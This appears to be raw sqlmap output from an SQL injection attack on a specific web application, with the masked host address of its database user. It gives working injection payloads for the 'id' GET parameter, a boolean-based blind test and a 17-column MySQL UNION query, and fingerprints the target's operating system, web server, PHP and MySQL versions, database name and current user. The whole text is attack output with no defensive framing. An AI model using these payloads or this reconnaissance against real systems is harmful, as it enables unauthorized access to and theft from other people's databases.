sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1396 AND 5271=5271    Type: UNION query    Title: MySQL UNION query (40) - 17 columns    Payload: id=-1610 UNION ALL SELECT 40,40,40,40,40,40,CONCAT(0x716b786271,0x49466774634a544b4657,0x716a627871),40,40,40,40,40,40,40,40,40,40#---web server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.3.29back-end DBMS: MySQL 4current user:    'root@**.**.**.**'current database:    'ktcis'current user is DBA:    False
